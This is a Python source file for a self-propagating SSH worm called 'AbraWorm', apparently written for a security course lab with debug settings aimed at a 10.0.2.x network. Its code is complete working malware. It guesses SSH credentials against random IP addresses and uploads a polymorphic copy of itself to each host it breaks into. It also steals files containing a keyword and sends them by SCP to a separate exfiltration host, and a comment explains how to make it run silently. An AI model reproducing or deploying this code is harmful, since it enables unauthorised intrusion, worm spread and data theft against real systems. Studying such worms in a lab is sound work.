#!/usr/bin/env python

import sys
import os
import random
import paramiko
import scp
import select
import signal
import glob
import tempfile
import string
import traceback
import logging # Added
import argparse # Added
from log_config import setup_logging # Added

# --- Argument Parsing ---
parser = argparse.ArgumentParser(description="AbraWorm SSH propagation script.")
parser.add_argument(
    '--log-level',
    choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
    default='INFO',
    help='Set the logging level (default: INFO)'
)
args = parser.parse_args()

# --- Configure Logging ---
setup_logging(args.log_level)

# --- Get Logger for this Module ---
logger = logging.getLogger(__name__)

# --- Existing Code Starts Here ---

##   You would want to uncomment the following two lines for the worm to
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT: Remains for debugging logic, separate from logging level

NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['10.0.2.10', '10.0.2.11']
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses

while True:
    logger.info("Starting main loop")
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
    logger.debug(f"Generated usernames: {usernames}")
    logger.debug(f"Generated passwords: {passwds}")

    for passwd in passwds:
        for user in usernames:
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                logger.info(f"Trying connection: user={user} host={ip_address}")
                files_of_interest_at_target = []
                ssh = None
                try:
                    logger.debug("Creating SSH client")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    logger.debug(f"Connecting: user={user} host={ip_address}")
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    logger.info(f"Connected successfully: user={user} host={ip_address}")

                    logger.debug(f"Checking if target host={ip_address} was previously infected")
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        logger.warning(f"Error executing 'ls' on host={ip_address}: {''.join(error)}")

                    received_list = list(map(lambda x: x.encode('utf-8').strip(), stdout.readlines())) # Decode and strip
                    logger.debug(f"Output of 'ls' on host={ip_address}: {received_list}")

                    # Check if 'AbraWorm.py' exists (more reliable check)
                    worm_present = any(b'AbraWorm.py' in item for item in received_list)
                    if worm_present:
                        logger.info(f"Target machine host={ip_address} is already infected, skipping.")
                        ssh.close() # Close connection before continuing
                        continue

                    logger.debug(f"Looking for files containing 'abracadabra' on host={ip_address}")
                    cmd = 'grep -ls abracadabra * 2>/dev/null'
                    stdin, stdout, stderr = ssh.exec_command(cmd)

                    error = stderr.readlines()
                    if error:
                         logger.warning(f"Error executing grep on host={ip_address}: {''.join(error)}")

                    received_list = list(map(lambda x: x.strip(), stdout.readlines())) # Already strings here
                    logger.debug(f"Grep results on host={ip_address}: {received_list}")

                    if not received_list:
                        logger.info(f"No 'abracadabra' files found on host={ip_address}")
                        files_of_interest_at_target = []
                    else:
                        files_of_interest_at_target = received_list
                        logger.info(f"Found files of interest on host={ip_address}: {files_of_interest_at_target}")

                    logger.debug(f"Setting up SCP connection for host={ip_address}")
                    scpcon = scp.SCPClient(ssh.get_transport())

                    if files_of_interest_at_target:
                        logger.info(f"Downloading {len(files_of_interest_at_target)} file(s) from host={ip_address}")
                        for target_file in files_of_interest_at_target:
                            try:
                                logger.debug(f"Downloading file={target_file} from host={ip_address}")
                                scpcon.get(target_file)
                                logger.info(f"Successfully downloaded file={target_file} from host={ip_address}")
                            except Exception as e_scp_get:
                                logger.error(f"Failed to download file={target_file} from host={ip_address}: {e_scp_get}")
                    else:
                        logger.info(f"No files to download from host={ip_address}")

                    # Create polymorphic worm variant
                    logger.debug("Creating polymorphic worm variant")
                    temp_file_path = None
                    try:
                        with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.py') as temp_file:
                            temp_file_path = temp_file.name
                            logger.debug(f"Created temp file: {temp_file_path}")

                            with open(sys.argv[0], 'r') as original:
                                content = original.readlines()
                            logger.debug(f"Read {len(content)} lines from original worm: {sys.argv[0]}")

                            # Modification 1: Add random new lines
                            for _ in range(3):
                                random_position = random.randint(0, len(content))
                                content.insert(random_position, "\n")
                            # Modification 2: Add random comments
                            for _ in range(2):
                                random_comment = '# ' + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20)) + '\n'
                                random_position = random.randint(0, len(content))
                                content.insert(random_position, random_comment)

                            temp_file.writelines(content)
                            logger.debug(f"Wrote polymorphic variant ({len(content)} lines) to {temp_file_path}")

                        logger.info(f"Uploading polymorphic worm to host={ip_address} as AbraWorm.py")
                        scpcon.put(temp_file_path, 'AbraWorm.py')
                        logger.info(f"Successfully uploaded worm to host={ip_address}")

                    except Exception as e_poly:
                         logger.exception(f"Error during polymorphic code generation/upload for host={ip_address}")
                    finally:
                        if temp_file_path and os.path.exists(temp_file_path):
                            try:
                                os.unlink(temp_file_path)
                                logger.debug(f"Cleaned up temp file: {temp_file_path}")
                            except OSError as e_unlink:
                                logger.warning(f"Failed to clean up temp file {temp_file_path}: {e_unlink}")

                    logger.debug(f"Closing SCP connection for host={ip_address}")
                    scpcon.close()
                    logger.debug(f"Closing SSH connection for host={ip_address}")
                    ssh.close()
                    ssh = None # Ensure ssh is None after successful close

                except Exception as e_main:
                    logger.exception(f"Error during main connection/operation for user={user} host={ip_address}")
                    if ssh:
                        try:
                            ssh.close()
                            logger.debug(f"Closed SSH connection due to error for host={ip_address}")
                        except Exception as e_close:
                            logger.error(f"Failed to close SSH connection after error for host={ip_address}: {e_close}")
                    continue # Move to the next IP address

                # Try to exfiltrate files (Only if connection was successful)
                if files_of_interest_at_target:
                    logger.info(f"Attempting exfiltration of {len(files_of_interest_at_target)} file(s) found on host={ip_address}")
                    ssh_exfil = None # Use a different variable name
                    try:
                        logger.debug("Creating SSH client for exfiltration")
                        ssh_exfil = paramiko.SSHClient()
                        ssh_exfil.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        exfil_host = '10.0.2.9'
                        exfil_user = 'seed'
                        exfil_pass = 'dees' # Consider using keys or safer methods
                        logger.info(f"Connecting to exfiltration host={exfil_host}")
                        ssh_exfil.connect(exfil_host, port=22, username=exfil_user, password=exfil_pass, timeout=5)

                        logger.debug(f"Setting up SCP for exfiltration to host={exfil_host}")
                        scpcon_exfil = scp.SCPClient(ssh_exfil.get_transport())
                        logger.info(f"Connected to exfiltration host={exfil_host}")

                        for filename in files_of_interest_at_target:
                            # IMPORTANT: Need full path if downloaded to default location
                            local_filepath = filename # Assumes file was downloaded to current dir
                            logger.info(f"Exfiltrating file={local_filepath} to host={exfil_host}")
                            try:
                                scpcon_exfil.put(local_filepath)
                                logger.info(f"Successfully exfiltrated file={local_filepath}")
                            except Exception as e_scp_put:
                                logger.error(f"Failed to exfiltrate file={local_filepath} to host={exfil_host}: {e_scp_put}")

                        logger.debug(f"Closing SCP connection to exfiltration host={exfil_host}")
                        scpcon_exfil.close()
                        logger.debug(f"Closing SSH connection to exfiltration host={exfil_host}")
                        ssh_exfil.close()
                        ssh_exfil = None
                    except Exception as e_exfil:
                        logger.exception(f"Exfiltration process failed")
                        if ssh_exfil:
                            try:
                                ssh_exfil.close()
                                logger.debug(f"Closed exfiltration SSH connection due to error")
                            except Exception as e_close_exfil:
                                logger.error(f"Failed to close exfiltration SSH connection after error: {e_close_exfil}")
                        continue # Still continue to the next IP in the main loop

    if debug:
        logger.info("Debug mode enabled - breaking out of main loop after one iteration.")
        break